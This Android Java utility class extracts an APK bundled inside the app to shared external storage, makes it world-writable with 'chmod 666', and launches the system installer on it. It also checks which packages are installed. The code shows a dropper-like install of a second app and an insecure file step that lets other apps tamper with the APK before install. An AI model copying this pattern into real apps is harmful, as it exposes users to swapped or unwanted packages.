package org.geometerplus.zlibrary.ui.michaelxia.util;

import java.io.File;
import java.io.InputStream;
import java.util.List;

import org.geometerplus.zlibrary.ui.michaelxia.R;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.util.Log;

public class PackageUtils {
    
    private static File OutFile = android.os.Environment.getExternalStorageDirectory();
    
    public static void startSystemInstallActivity(Context context) {
        Intent i = new Intent(Intent.ACTION_VIEW);
//        File upgradeFile = new File(context.getFilesDir() + "/" + "app.apk");
        File upgradeFile = new File(OutFile.getPath() + "/app.apk");
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
        context.startActivity(i); 
    }
    
    public static boolean dumpPackageInResourceRaw(Context context) {
        File file = new File(OutFile.getPath() + "/app.apk");
        if (!file.exists()) {
            if (unzipRawToPath(context, R.raw.app, "app.apk")) {
                return true;
            } else {
                return false;
            }
        }
        
        return true;
    }
    
    public static void deleteDumpPackageFile(Context context) {
        File file = new File(OutFile.getPath() + "/app.apk");
        file.delete();
    }
    
    private static boolean unzipRawToPath(Context context, int resourceId, String targetFileName) {
        try {
            Log.d(">>>>>>>>>>>>>>>>>>>>>>>>", "[[[unzipRawToPath]]]");
            
            InputStream is = context.getResources().openRawResource(resourceId);
            ZipUtil.outputFile(is, OutFile.getPath() + "/", targetFileName);
            Runtime.getRuntime().exec("chmod 666 " +  OutFile.getPath() + "/" + targetFileName);
            is.close();
            
            Log.d(">>>>>>>>>>>>>>>>>>>>>>>>", "[[[unzipRawToPath]]] return true"
                    + " file path = " + OutFile.getPath() + "/" + targetFileName);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public static boolean isPackageAlreadyInstalled(Context context, String pkgName) {
        List<PackageInfo> installedList = context.getPackageManager().getInstalledPackages(
                PackageManager.GET_UNINSTALLED_PACKAGES);
        int installedListSize = installedList.size();
        for(int i = 0; i < installedListSize; i++) {
            PackageInfo tmp = installedList.get(i);
            if(pkgName.equalsIgnoreCase(tmp.packageName)) {
                return true;
            }
            
        }
        return false;
    }
    
}
